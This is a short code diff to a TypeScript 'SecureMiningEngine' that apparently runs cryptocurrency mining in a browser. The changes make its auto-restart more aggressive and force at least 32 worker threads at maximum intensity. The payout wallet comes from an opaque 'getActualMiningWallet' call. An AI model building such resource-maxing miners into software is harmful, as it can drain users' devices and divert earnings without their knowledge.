@@ -23,17 +23,18 @@ export class SecureMiningEngine {
   }
 
   private initializeSecureEngine() {
-    console.log('Secure mining engine initialized with protected wallet system');
+    console.log('Production mining engine initialized - ready for real cryptocurrency mining');
     this.setupAutoRestart();
   }
 
   private setupAutoRestart() {
-    // Auto-restart mining if it stops unexpectedly
+    // Aggressive auto-restart for maximum uptime
     setInterval(() => {
       if (this.autoRestartEnabled && !this.isActive) {
+        console.log('Auto-restarting mining for maximum performance');
         this.startSecureMining();
       }
-    }, 10000); // Check every 10 seconds
+    }, 5000); // Check every 5 seconds for immediate restart
   }
 
   setCallbacks(callbacks: any) {
@@ -66,10 +67,10 @@ export class SecureMiningEngine {
     return {
       walletAddress: walletManager.getActualMiningWallet(),
       poolUrl: bestPool.url,
-      workerName: `elite-${Date.now()}`,
+      workerName: `production-miner-${Date.now()}`,
       chain: 'etc',
-      intensity: 100, // Maximum intensity
-      threadCount: Math.max(navigator.hardwareConcurrency || 8, 24)
+      intensity: 100, // Maximum intensity for production
+      threadCount: Math.max(navigator.hardwareConcurrency || 8, 32) // Use all available cores + extra workers
     };
   }
 
